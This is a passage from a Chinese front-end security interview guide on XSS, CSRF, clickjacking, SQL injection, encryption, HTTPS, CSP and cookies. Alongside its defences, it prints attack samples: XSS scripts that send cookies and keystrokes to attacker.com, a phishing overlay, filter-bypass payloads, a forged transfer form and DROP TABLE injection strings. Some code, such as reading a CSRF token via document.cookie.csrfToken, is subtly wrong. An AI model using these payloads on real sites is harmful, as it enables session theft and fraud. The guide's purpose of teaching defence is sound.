# 前端安全资深面试指南

## 目录
1. [XSS 攻击](#1-xss-攻击)
2. [CSRF 攻击](#2-csrf-攻击)
3. [点击劫持](#3-点击劫持)
4. [SQL 注入](#4-sql-注入)
5. [前端加密](#5-前端加密)
6. [HTTPS 与证书](#6-https-与证书)
7. [内容安全策略 CSP](#7-内容安全策略-csp)
8. [Cookie 安全](#8-cookie-安全)
9. [认证与授权](#9-认证与授权)
10. [依赖安全](#10-依赖安全)
11. [安全编码实践](#11-安全编码实践)
12. [经典面试题](#12-经典面试题)

---

## 1. XSS 攻击

### 1.1 XSS 类型

```javascript
// 1. 存储型 XSS（Stored XSS）
// 最危险，攻击代码存储在服务器数据库中

// 攻击场景：评论系统
const comment = '<script>alert(document.cookie)</script>';
// 提交到服务器存储
// 其他用户访问时，脚本被执行

// 2. 反射型 XSS（Reflected XSS）
// 攻击代码在 URL 中，通过服务器反射回页面

// 攻击 URL
https://example.com/search?q=<script>alert(1)</script>

// 服务器直接返回
<div>搜索结果：<script>alert(1)</script></div>

// 3. DOM 型 XSS（DOM-based XSS）
// 完全在客户端执行，不经过服务器

// 攻击代码
const search = location.search.slice(1);
document.getElementById('result').innerHTML = search;

// 攻击 URL
https://example.com/#<img src=x onerror=alert(1)>
```

### 1.2 XSS 攻击手段

```javascript
// 1. 窃取 Cookie
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: document.cookie
  });
</script>

// 2. 键盘监听
<script>
  document.addEventListener('keypress', (e) => {
    fetch('https://attacker.com/log?key=' + e.key);
  });
</script>

// 3. 伪造表单
<script>
  const form = document.createElement('form');
  form.action = 'https://bank.com/transfer';
  form.method = 'POST';
  form.innerHTML = '<input name="to" value="attacker"><input name="amount" value="1000">';
  document.body.appendChild(form);
  form.submit();
</script>

// 4. 网络钓鱼
<script>
  document.body.innerHTML = `
    <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999">
      <h1>Session Expired</h1>
      <form action="https://attacker.com/phishing">
        <input name="username" placeholder="Username">
        <input name="password" type="password" placeholder="Password">
        <button>Login</button>
      </form>
    </div>
  `;
</script>

// 5. 绕过过滤的技巧
// 大小写绕过
<ScRiPt>alert(1)</ScRiPt>

// 编码绕过
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">

// 事件绕过
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<svg onload=alert(1)>

// 伪协议
<a href="javascript:alert(1)">Click</a>
<iframe src="data:text/html,<script>alert(1)</script>">

// HTML 实体
<div title="&lt;script&gt;alert(1)&lt;/script&gt;"></div>
```

### 1.3 XSS 防御

```javascript
// 1. 输入过滤与验证
function validateInput(input) {
  // 白名单验证
  const pattern = /^[a-zA-Z0-9\s]+$/;
  if (!pattern.test(input)) {
    throw new Error('Invalid input');
  }
  return input;
}

// 2. 输出转义（最重要）
function escapeHtml(str) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;'
  };
  return str.replace(/[&<>"'/]/g, (char) => map[char]);
}

// 使用
const userInput = '<script>alert(1)</script>';
const safe = escapeHtml(userInput);
element.textContent = safe; // 使用 textContent 而不是 innerHTML

// 3. 使用安全的 API
// 危险
element.innerHTML = userInput;

// 安全
element.textContent = userInput;

// 4. DOMPurify 库（推荐）
import DOMPurify from 'dompurify';

const dirty = '<img src=x onerror=alert(1)>';
const clean = DOMPurify.sanitize(dirty);
element.innerHTML = clean;

// 配置选项
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href']
});

// 5. Content Security Policy (CSP)
// HTTP 头部
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'

// HTML meta 标签
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'">

// 6. HttpOnly Cookie
// 防止 JavaScript 访问 Cookie
Set-Cookie: sessionId=abc123; HttpOnly; Secure

// 7. X-XSS-Protection 头部（已过时，使用 CSP 替代）
X-XSS-Protection: 1; mode=block

// 8. React/Vue 自动转义
// React
function Component({ userInput }) {
  return <div>{userInput}</div>; // 自动转义
}

// 危险：关闭转义
<div dangerouslySetInnerHTML={{ __html: userInput }} />

// Vue
<div>{{ userInput }}</div> <!-- 自动转义 -->
<div v-html="userInput"></div> <!-- 危险 -->

// 9. 富文本编辑器安全
// 使用白名单
const allowedTags = ['p', 'br', 'strong', 'em', 'u', 'a', 'img'];
const allowedAttrs = {
  'a': ['href', 'title'],
  'img': ['src', 'alt']
};

function sanitizeRichText(html) {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: allowedTags,
    ALLOWED_ATTR: allowedAttrs
  });
}

// 10. URL 参数处理
function getQueryParam(name) {
  const params = new URLSearchParams(location.search);
  const value = params.get(name);
  return escapeHtml(value); // 必须转义
}
```

### 1.4 XSS 检测工具

```javascript
// 1. 手动测试 Payload
const payloads = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  'javascript:alert(1)',
  '<iframe src="javascript:alert(1)">',
  '<body onload=alert(1)>',
  '<input onfocus=alert(1) autofocus>',
  '<select onfocus=alert(1) autofocus>',
  '<textarea onfocus=alert(1) autofocus>',
  '<keygen onfocus=alert(1) autofocus>',
  '<video><source onerror="alert(1)">',
  '<audio src=x onerror=alert(1)>',
  '<details open ontoggle=alert(1)>',
  '<marquee onstart=alert(1)>'
];

// 2. 自动化扫描
// 使用 OWASP ZAP、Burp Suite 等工具

// 3. 浏览器开发者工具
// 检查 DOM 是否被注入恶意代码
console.log(document.body.innerHTML);
```

---

## 2. CSRF 攻击

### 2.1 CSRF 原理

```javascript
// CSRF (Cross-Site Request Forgery) 跨站请求伪造

// 攻击场景：用户登录了 bank.com
// 1. 用户访问 bank.com，获得 Cookie
// 2. 用户访问恶意网站 attacker.com
// 3. attacker.com 包含以下代码：

// 方式1：表单自动提交
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker">
  <input name="amount" value="1000">
</form>
<script>
  document.forms[0].submit();
</script>

// 方式2：图片标签（GET 请求）
<img src="https://bank.com/transfer?to=attacker&amount=1000">

// 方式3：AJAX 请求（同源策略限制，但可能绕过）
fetch('https://bank.com/transfer', {
  method: 'POST',
  credentials: 'include', // 携带 Cookie
  body: JSON.stringify({ to: 'attacker', amount: 1000 })
});

// 浏览器自动携带 bank.com 的 Cookie
// 服务器认为这是合法请求
// 转账成功！
```

### 2.2 CSRF 防御

```javascript
// 1. CSRF Token（最常用）

// 服务器生成 token
const csrfToken = crypto.randomBytes(32).toString('hex');
res.cookie('csrfToken', csrfToken);

// 前端发送请求时携带 token
// 方式1：请求头
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': document.cookie.csrfToken
  },
  body: JSON.stringify({ to: 'user', amount: 100 })
});

// 方式2：请求体
<form method="POST" action="/transfer">
  <input type="hidden" name="csrfToken" value="<%= csrfToken %>">
  <input name="to">
  <input name="amount">
  <button>Submit</button>
</form>

// 服务器验证
app.post('/api/transfer', (req, res) => {
  const tokenFromCookie = req.cookies.csrfToken;
  const tokenFromRequest = req.headers['x-csrf-token'] || req.body.csrfToken;
  
  if (!tokenFromRequest || tokenFromRequest !== tokenFromCookie) {
    return res.status(403).send('Invalid CSRF token');
  }
  
  // 处理转账
});

// 2. SameSite Cookie（推荐）
Set-Cookie: sessionId=abc123; SameSite=Strict; Secure; HttpOnly

// SameSite 选项：
// • Strict: 完全禁止跨站发送（最安全，但可能影响用户体验）
// • Lax: 导航跳转允许（GET），表单提交禁止（默认值，推荐）
// • None: 允许跨站（必须配合 Secure，即 HTTPS）

// 3. 验证 Referer/Origin 头部
app.post('/api/transfer', (req, res) => {
  const origin = req.headers.origin || req.headers.referer;
  const allowedOrigins = ['https://example.com'];
  
  if (!origin || !allowedOrigins.some(allowed => origin.startsWith(allowed))) {
    return res.status(403).send('Invalid origin');
  }
  
  // 处理请求
});

// 4. 双重 Cookie 验证
// Cookie 中存一份 token
Set-Cookie: csrfToken=abc123

// 请求头中也要带一份
X-CSRF-Token: abc123

// 攻击者无法读取受害者的 Cookie，所以无法构造有效请求

// 5. 自定义请求头（利用同源策略）
// AJAX 请求添加自定义头
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-Requested-With': 'XMLHttpRequest'
  },
  body: JSON.stringify({ to: 'user', amount: 100 })
});

// 服务器验证
if (req.headers['x-requested-with'] !== 'XMLHttpRequest') {
  return res.status(403).send('Invalid request');
}

// 原理：跨站无法添加自定义头（被同源策略阻止）

// 6. 验证码/密码确认
// 敏感操作要求用户输入验证码或密码
<form method="POST" action="/transfer">
  <input name="to">
  <input name="amount">
  <input name="password" type="password" placeholder="确认密码">
  <button>Submit</button>
</form>

// 7. 使用 POST 而不是 GET
// GET 请求容易被 img、link 等标签利用
// POST 需要表单，相对难一些（但仍需其他防护）

// 8. 短时效 Token
// Token 有效期短（如 30 分钟），定期刷新
const tokenExpiry = Date.now() + 30 * 60 * 1000;
```

### 2.3 CSRF vs XSS

```javascript
// CSRF:
// • 借用用户身份
// • 无法获取响应内容
// • 需要用户已登录
// • 防御：CSRF Token、SameSite Cookie

// XSS:
// • 注入恶意脚本
// • 可以获取响应内容
// • 可以窃取 Cookie
// • 防御：输出转义、CSP、HttpOnly Cookie
```

---

## 3. 点击劫持

### 3.1 点击劫持原理

```html
<!-- 攻击者网站 attacker.com -->
<!DOCTYPE html>
<html>
<head>
  <style>
    #target {
      position: absolute;
      top: 0;
      left: 0;
      opacity: 0; /* 完全透明 */
      width: 100%;
      height: 100%;
      z-index: 9999;
    }
    
    #fake-button {
      position: absolute;
      top: 200px;
      left: 200px;
      width: 200px;
      height: 50px;
      background: green;
      color: white;
      text-align: center;
      line-height: 50px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <!-- 透明的 iframe，覆盖在伪造按钮上 -->
  <iframe id="target" src="https://bank.com/delete-account"></iframe>
  
  <!-- 诱导用户点击的按钮 -->
  <div id="fake-button">点击领取 1000 元红包</div>
</body>
</html>

<!-- 
用户以为点击"领取红包"，实际点击了 iframe 中的"删除账户"按钮
-->
```

### 3.2 点击劫持防御

```javascript
// 1. X-Frame-Options 头部（最简单有效）

// 禁止被嵌入
X-Frame-Options: DENY

// 只允许同源嵌入
X-Frame-Options: SAMEORIGIN

// 允许指定来源嵌入
X-Frame-Options: ALLOW-FROM https://trusted.com

// Express 示例
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'DENY');
  next();
});

// 2. CSP frame-ancestors（更现代，推荐）
Content-Security-Policy: frame-ancestors 'self'

// 允许特定来源
Content-Security-Policy: frame-ancestors 'self' https://trusted.com

// 禁止所有嵌入
Content-Security-Policy: frame-ancestors 'none'

// 3. JavaScript 检测（前端防御）
// 检测是否在 iframe 中
if (top !== self) {
  // 方式1：跳出 iframe
  top.location = self.location;
  
  // 方式2：隐藏内容
  document.body.style.display = 'none';
  alert('检测到页面被嵌入，为了您的安全，请直接访问我们的网站');
}

// 更强的检测
(function() {
  if (self !== top) {
    // 创建一个全屏遮罩
    const overlay = document.createElement('div');
    overlay.style.cssText = `
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: #fff;
      z-index: 999999;
    `;
    overlay.innerHTML = '<h1>请直接访问我们的网站</h1>';
    document.body.appendChild(overlay);
    
    // 尝试跳出
    top.location = self.location;
  }
})();

// 4. 结合 frame-busting
// 防止攻击者禁用 JavaScript
<style>
  /* 默认隐藏页面 */
  body { display: none !important; }
</style>

<script>
  // 检测通过后才显示
  if (self === top) {
    document.body.style.display = 'block';
  } else {
    top.location = self.location;
  }
</script>

// 5. 用户交互确认
// 敏感操作要求二次确认
button.addEventListener('click', (e) => {
  if (!confirm('确认删除账户吗？此操作不可恢复')) {
    e.preventDefault();
  }
});
```

### 3.3 双重点击劫持

```javascript
// 攻击者可能使用双重 iframe 绕过 frame-busting

// 防御：使用 HTTP 头部而不是 JavaScript
// X-Frame-Options 和 CSP frame-ancestors 无法被 JavaScript 绕过
```

---

## 4. SQL 注入

### 4.1 SQL 注入原理

```javascript
// 前端发送用户输入
const username = "admin' OR '1'='1";
const password = "anything";

fetch('/login', {
  method: 'POST',
  body: JSON.stringify({ username, password })
});

// 后端拼接 SQL（错误做法）
const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
// 实际执行的 SQL：
// SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'
// 条件恒为真，绕过密码验证

// 更危险的注入
const username = "admin'; DROP TABLE users; --";
// 实际执行：
// SELECT * FROM users WHERE username='admin'; DROP TABLE users; --' AND password='...'
// 删除整个用户表！
```

### 4.2 SQL 注入防御

```javascript
// 1. 参数化查询（最重要）

// Node.js + MySQL
const mysql = require('mysql2');
const connection = mysql.createConnection({...});

// 错误：字符串拼接
const query = `SELECT * FROM users WHERE username='${username}'`;

// 正确：参数化查询
const query = 'SELECT * FROM users WHERE username=? AND password=?';
connection.execute(query, [username, password], (err, results) => {
  // 处理结果
});

// 2. ORM 使用（推荐）

// Sequelize
const user = await User.findOne({
  where: {
    username: username,
    password: password
  }
});

// TypeORM
const user = await userRepository.findOne({
  where: {
    username,
    password
  }
});

// 3. 存储过程
// 数据库存储过程已预编译，参数不会被当作 SQL 执行

// 4. 输入验证

// 白名单验证
function validateUsername(username) {
  const pattern = /^[a-zA-Z0-9_]{3,20}$/;
  if (!pattern.test(username)) {
    throw new Error('Invalid username format');
  }
  return username;
}

// 5. 最小权限原则
// 数据库用户只给必要权限，不要使用 root

// 6. 错误信息不暴露细节
// 错误
catch (err) {
  res.send(err.message); // 可能暴露数据库结构
}

// 正确
catch (err) {
  console.error(err);
  res.status(500).send('操作失败，请稍后重试');
}

// 7. WAF（Web Application Firewall）
// 使用 ModSecurity 等工具检测 SQL 注入
```

### 4.3 前端与 SQL 注入

```javascript
// 前端无法完全防御 SQL 注入（因为可以绕过前端直接请求后端）
// 但前端可以做：

// 1. 输入验证（用户体验）
function validateInput(input) {
  // 拒绝明显的注入特征
  const dangerousPatterns = [
    /('|"|;|--|\/\*|\*\/|xp_|sp_|exec|execute|select|insert|update|delete|drop|create|alter)/i
  ];
  
  return !dangerousPatterns.some(pattern => pattern.test(input));
}

// 2. 输入长度限制
<input maxlength="50">

// 3. 类型检查
function validateUserId(id) {
  const numId = Number(id);
  if (!Number.isInteger(numId) || numId <= 0) {
    throw new Error('Invalid user ID');
  }
  return numId;
}

// 注意：前端验证只是辅助，真正的防御必须在后端！
```

---

## 5. 前端加密

### 5.1 常见加密算法

```javascript
// 1. MD5（不安全，已被破解，不推荐用于密码）
import md5 from 'crypto-js/md5';

const hash = md5('password').toString();
// 5f4dcc3b5aa765d61d8327deb882cf99

// 2. SHA-256（单向哈希，适合密码）
import SHA256 from 'crypto-js/sha256';

const hash = SHA256('password').toString();
// 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8

// 3. AES（对称加密，适合数据加密）
import CryptoJS from 'crypto-js';

// 加密
const encrypted = CryptoJS.AES.encrypt('secret data', 'secret-key').toString();

// 解密
const decrypted = CryptoJS.AES.decrypt(encrypted, 'secret-key').toString(CryptoJS.enc.Utf8);

// 4. RSA（非对称加密，适合密钥交换）
import { JSEncrypt } from 'jsencrypt';

// 生成密钥对（通常在后端生成）
const encrypt = new JSEncrypt();
encrypt.setPublicKey(publicKey);

// 加密
const encrypted = encrypt.encrypt('password');

// 解密（在后端）
const decrypt = new JSEncrypt();
decrypt.setPrivateKey(privateKey);
const decrypted = decrypt.decrypt(encrypted);

// 5. HMAC（消息认证码）
import HmacSHA256 from 'crypto-js/hmac-sha256';

const hmac = HmacSHA256('message', 'secret-key').toString();
```

### 5.2 密码安全处理

```javascript
// 1. 密码加盐（Salt）+ 哈希
import SHA256 from 'crypto-js/sha256';

function hashPassword(password) {
  const salt = crypto.randomBytes(16).toString('hex');
  const hash = SHA256(password + salt).toString();
  return { salt, hash };
}

function verifyPassword(password, salt, hash) {
  const newHash = SHA256(password + salt).toString();
  return newHash === hash;
}

// 2. bcrypt（推荐，自动加盐）
import bcrypt from 'bcryptjs';

// 生成哈希
const hash = await bcrypt.hash('password', 10); // 10 是 cost factor

// 验证
const isValid = await bcrypt.compare('password', hash);

// 3. PBKDF2（密钥派生函数）
import CryptoJS from 'crypto-js';

const hash = CryptoJS.PBKDF2('password', 'salt', {
  keySize: 256/32,
  iterations: 10000
}).toString();

// 4. 前端密码传输
// 方式1：HTTPS + 明文（最推荐）
// HTTPS 已经加密，无需额外加密

// 方式2：RSA 加密（额外防护）
// 适用于不信任网络环境
const encrypted = rsaEncrypt(password, publicKey);
fetch('/login', {
  method: 'POST',
  body: JSON.stringify({ password: encrypted })
});

// 方式3：客户端哈希（不推荐）
// 问题：哈希值本身可以被重放攻击
const hashed = SHA256(password).toString();
// 攻击者直接用哈希值登录，无需知道原始密码
```

### 5.3 敏感数据保护

```javascript
// 1. 不在前端存储敏感信息
// 错误
localStorage.setItem('creditCard', '1234-5678-9012-3456');

// 正确：只存储必要的非敏感信息
localStorage.setItem('userId', '123');

// 2. Token 过期处理
function saveToken(token) {
  const expiry = Date.now() + 7 * 24 * 60 * 60 * 1000; // 7 天
  localStorage.setItem('token', token);
  localStorage.setItem('tokenExpiry', expiry);
}

function getToken() {
  const token = localStorage.getItem('token');
  const expiry = localStorage.getItem('tokenExpiry');
  
  if (Date.now() > expiry) {
    localStorage.removeItem('token');
    localStorage.removeItem('tokenExpiry');
    return null;
  }
  
  return token;
}

// 3. 内存中处理敏感数据
// 使用完立即清除
let sensitiveData = fetchSensitiveData();
processSensitiveData(sensitiveData);
sensitiveData = null; // 清除引用，帮助垃圾回收

// 4. 加密存储
function setEncrypted(key, value) {
  const encrypted = CryptoJS.AES.encrypt(value, 'secret-key').toString();
  localStorage.setItem(key, encrypted);
}

function getEncrypted(key) {
  const encrypted = localStorage.getItem(key);
  const decrypted = CryptoJS.AES.decrypt(encrypted, 'secret-key').toString(CryptoJS.enc.Utf8);
  return decrypted;
}

// 5. 禁用自动填充敏感字段
<input type="password" autocomplete="new-password">
<input type="text" autocomplete="off" data-sensitive>

// 6. 清除粘贴板
input.addEventListener('paste', (e) => {
  e.preventDefault();
  alert('不允许粘贴');
});

// 7. 防止截图（移动端）
// React Native
import { ScreenCapture } from 'react-native-screen-capture';
ScreenCapture.preventScreenCapture();
```

### 5.4 Web Crypto API

```javascript
// 浏览器原生加密 API（推荐）

// 1. 生成随机数
const randomBytes = crypto.getRandomValues(new Uint8Array(16));

// 2. 生成密钥
const key = await crypto.subtle.generateKey(
  {
    name: 'AES-GCM',
    length: 256
  },
  true, // 可导出
  ['encrypt', 'decrypt']
);

// 3. 加密
const iv = crypto.getRandomValues(new Uint8Array(12));
const encrypted = await crypto.subtle.encrypt(
  {
    name: 'AES-GCM',
    iv: iv
  },
  key,
  new TextEncoder().encode('secret message')
);

// 4. 解密
const decrypted = await crypto.subtle.decrypt(
  {
    name: 'AES-GCM',
    iv: iv
  },
  key,
  encrypted
);
const message = new TextDecoder().decode(decrypted);

// 5. 哈希
const msgBuffer = new TextEncoder().encode('message');
const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
const hashArray = Array.from(new Uint8Array(hashBuffer));
const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');

// 6. 签名与验证
const keyPair = await crypto.subtle.generateKey(
  {
    name: 'RSASSA-PKCS1-v1_5',
    modulusLength: 2048,
    publicExponent: new Uint8Array([1, 0, 1]),
    hash: 'SHA-256'
  },
  true,
  ['sign', 'verify']
);

// 签名
const signature = await crypto.subtle.sign(
  'RSASSA-PKCS1-v1_5',
  keyPair.privateKey,
  msgBuffer
);

// 验证
const isValid = await crypto.subtle.verify(
  'RSASSA-PKCS1-v1_5',
  keyPair.publicKey,
  signature,
  msgBuffer
);
```

---

## 6. HTTPS 与证书

### 6.1 HTTPS 原理

```
HTTPS = HTTP + TLS/SSL

TLS 握手流程（TLS 1.3 简化版）：

Client                                Server
  │                                     │
  ├──── ClientHello ───────────────────→│
  │     • 支持的密码套件                 │
  │     • 随机数 Client Random           │
  │     • 支持的 TLS 版本                │
  │                                     │
  │←──── ServerHello ───────────────────┤
  │     • 选择的密码套件                 │
  │     • 随机数 Server Random           │
  │     • 证书（包含公钥）               │
  │     • 密钥交换参数                   │
  │                                     │
  ├──── Finished ──────────────────────→│
  │     （使用协商的密钥加密）           │
  │                                     │
  │←──── Finished ──────────────────────┤
  │                                     │
  │ Encrypted Application Data          │
  │◄────────────────────────────────────►│

对称加密：
• 加密/解密使用同一密钥
• 快速，适合大量数据
• 算法：AES、ChaCha20

非对称加密：
• 加密/解密使用不同密钥（公钥/私钥）
• 慢，适合密钥交换
• 算法：RSA、ECDSA

混合加密：
• 使用非对称加密交换对称密钥
• 使用对称加密传输数据
```

### 6.2 证书验证

```javascript
// 证书链验证

Root CA（根证书颁发机构）
  └─ Intermediate CA（中间证书）
      └─ Server Certificate（服务器证书）

// 浏览器验证步骤：
// 1. 检查证书有效期
// 2. 检查证书域名是否匹配
// 3. 检查证书签名是否有效
// 4. 检查证书是否被吊销（CRL/OCSP）
// 5. 验证证书链

// 证书固定（Certificate Pinning）
// 移动端 APP 可以内置期望的证书公钥
const expectedPublicKey = '...';

fetch('https://api.example.com/data')
  .then(async res => {
    // 获取证书信息（实际需要原生代码支持）
    const cert = await getServerCertificate();
    if (cert.publicKey !== expectedPublicKey) {
      throw new Error('Certificate pinning failed');
    }
    return res.json();
  });

// HTTP Public Key Pinning (HPKP)（已废弃）
// 使用 Expect-CT 替代
Expect-CT: max-age=86400, enforce
```

### 6.3 HTTPS 配置

```nginx
# Nginx HTTPS 配置

server {
    listen 443 ssl http2;
    server_name example.com;
    
    # 证书文件
    ssl_certificate /path/to/cert.pem;
    ssl_certificate_key /path/to/key.pem;
    
    # 推荐的密码套件
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256';
    ssl_prefer_server_ciphers on;
    
    # HSTS
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
    
    # OCSP Stapling
    ssl_stapling on;
    ssl_stapling_verify on;
    
    # Session 缓存
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 10m;
}

# 强制 HTTPS
server {
    listen 80;
    server_name example.com;
    return 301 https://$server_name$request_uri;
}
```

### 6.4 混合内容

```javascript
// Mixed Content（混合内容）
// HTTPS 页面加载 HTTP 资源

// 主动混合内容（会被阻止）
<script src="http://example.com/script.js"></script>

// 被动混合内容（会警告）
<img src="http://example.com/image.jpg">

// 解决方案：

// 1. 使用 HTTPS 资源
<script src="https://example.com/script.js"></script>

// 2. 使用协议相对 URL
<script src="//example.com/script.js"></script>
// 自动根据页面协议选择 http:// 或 https://

// 3. Content-Security-Policy
Content-Security-Policy: upgrade-insecure-requests
// 自动将 HTTP 请求升级为 HTTPS

// 4. 检测混合内容
if (location.protocol === 'https:' && 
    document.querySelector('script[src^="http:"]')) {
  console.warn('Mixed content detected');
}
```

---

## 7. 内容安全策略 CSP

### 7.1 CSP 基础

```javascript
// Content-Security-Policy HTTP 头部

// 1. 只允许同源资源
Content-Security-Policy: default-src 'self'

// 2. 允许特定来源
Content-Security-Policy: default-src 'self' https://trusted.com

// 3. 分指令配置
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' https://cdn.example.com;
  style-src 'self' 'unsafe-inline';
  img-src *;
  font-src 'self' data:;
  connect-src 'self' https://api.example.com

// 4. 使用 nonce
// 后端生成随机 nonce
const nonce = crypto.randomBytes(16).toString('base64');
res.setHeader('Content-Security-Policy', `script-src 'nonce-${nonce}'`);

// 前端使用
<script nonce="random123">
  console.log('Allowed');
</script>

// 5. 使用 hash
// 计算脚本内容的哈希
const hash = crypto.createHash('sha256').update('console.log("hello")').digest('base64');
Content-Security-Policy: script-src 'sha256-${hash}'

<script>console.log('hello')</script> // 允许
<script>alert(1)</script> // 阻止

// 6. 报告模式
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report

// 浏览器发送违规报告
{
  "csp-report": {
    "document-uri": "https://example.com/page",
    "violated-directive": "script-src",
    "blocked-uri": "https://evil.com/malicious.js",
    "source-file": "https://example.com/page",
    "line-number": 10,
    "column-number": 5
  }
}
```

### 7.2 CSP 指令

```javascript
// 常用指令

// default-src: 默认策略
default-src 'self'

// script-src: JavaScript
script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.com

// style-src: CSS
style-src 'self' 'unsafe-inline'

// img-src: 图片
img-src * data: blob:

// font-src: 字体
font-src 'self' data:

// connect-src: AJAX、WebSocket、EventSource
connect-src 'self' https://api.com

// media-src: <audio>、<video>
media-src 'self' https://media.com

// object-src: <object>、<embed>、<applet>
object-src 'none'

// frame-src: iframe
frame-src 'self'

// frame-ancestors: 谁可以嵌入此页面（防点击劫持）
frame-ancestors 'self' https://trusted.com

// base-uri: <base>
base-uri 'self'

// form-action: <form> action
form-action 'self'

// upgrade-insecure-requests: HTTP → HTTPS
upgrade-insecure-requests

// block-all-mixed-content: 阻止混合内容
block-all-mixed-content

// 特殊值：
// 'none': 禁止所有
// 'self': 同源
// 'unsafe-inline': 允许内联脚本/样式
// 'unsafe-eval': 允许 eval()
// 'strict-dynamic': 信任动态加载的脚本
// 'nonce-xxx': nonce 验证
// 'sha256-xxx': hash 验证
```

### 7.3 CSP 实战

```javascript
// 1. 严格 CSP（推荐）
Content-Security-Policy: 
  default-src 'none';
  script-src 'self' 'nonce-${nonce}' 'strict-dynamic';
  style-src 'self' 'nonce-${nonce}';
  img-src 'self' https: data:;
  font-src 'self';
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  upgrade-insecure-requests;
  block-all-mixed-content

// 2. Meta 标签（备用方案）
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self' 'nonce-random123'">

// 3. 动态脚本加载
// 使用 nonce
const script = document.createElement('script');
script.src = '/dynamic.js';
script.nonce = document.currentScript.nonce; // 继承 nonce
document.body.appendChild(script);

// 或使用 'strict-dynamic'
// 允许被信任脚本动态加载的脚本

// 4. React 中使用 CSP
// 禁用 unsafe-inline，使用 nonce
function App({ nonce }) {
  return (
    <>
      <style nonce={nonce}>{`
        .app { color: red; }
      `}</style>
      <script nonce={nonce}>{`
        console.log('Allowed');
      `}</script>
    </>
  );
}

// 5. 处理第三方脚本
// 方式1：添加到白名单
script-src 'self' https://www.google-analytics.com

// 方式2：使用 nonce
<script nonce="random123" src="https://third-party.com/sdk.js"></script>

// 6. 监听 CSP 违规
document.addEventListener('securitypolicyviolation', (e) => {
  console.error('CSP violation:', {
    blockedURI: e.blockedURI,
    violatedDirective: e.violatedDirective,
    sourceFile: e.sourceFile,
    lineNumber: e.lineNumber
  });
  
  // 上报到服务器
  fetch('/csp-report', {
    method: 'POST',
    body: JSON.stringify({
      blockedURI: e.blockedURI,
      violatedDirective: e.violatedDirective
    })
  });
});
```

---

## 8. Cookie 安全

### 8.1 Cookie 属性

```javascript
// 完整的安全 Cookie 配置
Set-Cookie: sessionId=abc123; 
  HttpOnly;              // 禁止 JavaScript 访问
  Secure;                // 只在 HTTPS 发送
  SameSite=Strict;       // 防止 CSRF
  Path=/;                // 作用路径
  Domain=.example.com;   // 作用域名
  Max-Age=3600;          // 有效期（秒）
  Expires=Wed, 09 Jun 2027 10:18:14 GMT

// 各属性详解：

// 1. HttpOnly: 防止 XSS 窃取 Cookie
document.cookie; // 无法访问 HttpOnly Cookie

// 2. Secure: 防止中间人攻击
// 只在 HTTPS 连接中发送

// 3. SameSite: 防止 CSRF
// Strict: 完全禁止跨站发送
// Lax: 导航跳转允许（GET），表单提交禁止（默认）
// None: 允许跨站（必须配合 Secure）

// 4. Domain: 控制作用域
// .example.com: 所有子域名都可访问
// example.com: 只有主域名可访问

// 5. Path: 控制作用路径
// /: 所有路径
// /admin: 只有 /admin 下可访问

// 6. Max-Age vs Expires
// Max-Age: 相对时间（秒）
// Expires: 绝对时间（GMT 格式）
// Max-Age 优先级更高
```

### 8.2 Cookie 前缀

```javascript
// __Secure- 前缀
// 必须设置 Secure 属性
Set-Cookie: __Secure-sessionId=abc123; Secure; Path=/

// __Host- 前缀（更严格）
// 必须设置 Secure
// 必须没有 Domain 属性
// 必须 Path=/
Set-Cookie: __Host-sessionId=abc123; Secure; Path=/

// 用途：防止子域名劫持 Cookie
```

### 8.3 Cookie 最佳实践

```javascript
// 1. 敏感 Cookie 设置
res.cookie('sessionId', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 7 * 24 * 60 * 60 * 1000 // 7 天
});

// 2. 分离敏感和非敏感 Cookie
// 敏感：sessionId、csrfToken
res.cookie('sessionId', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'
});

// 非敏感：语言、主题
res.cookie('theme', 'dark', {
  httpOnly: false, // 允许 JS 访问
  secure: true,
  sameSite: 'lax'
});

// 3. Token 刷新机制
// Access Token: 短期（15 分钟）
// Refresh Token: 长期（7 天）
res.cookie('accessToken', accessToken, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 15 * 60 * 1000 // 15 分钟
});

res.cookie('refreshToken', refreshToken, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 天
  path: '/api/refresh' // 只在刷新接口发送
});

// 4. Cookie 大小限制
// 单个 Cookie: 4KB
